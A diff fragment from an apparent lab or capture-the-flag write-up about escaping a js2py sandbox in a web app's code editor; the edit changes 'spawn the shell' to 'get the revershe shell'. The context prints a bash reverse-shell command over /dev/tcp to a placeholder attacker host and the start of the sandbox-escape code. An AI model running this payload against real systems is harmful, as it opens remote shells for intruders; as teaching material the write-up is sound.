@@ -40,7 +40,7 @@ After we register and log in on the web app, there is a Code Editor that allows 
 version of <b>js2py</b> to sandbox-escape is being used.
 <img width="978" height="896" alt="image" src="https://github.com/user-attachments/assets/a1d2ea57-dbb4-4f55-88a3-aaad85e2583e" />
 <br>
-I used the publicly available code for the sandbox-escape to spawn the shell:
+I used the publicly available code for the sandbox-escape to get the revershe shell:
 <pre><code class="language-js">let cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/{YOUR_IP}/{LISTENER_PORT} 0>&1'"
 let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__
 let obj = a(a(a,"__class__"), "__base__")
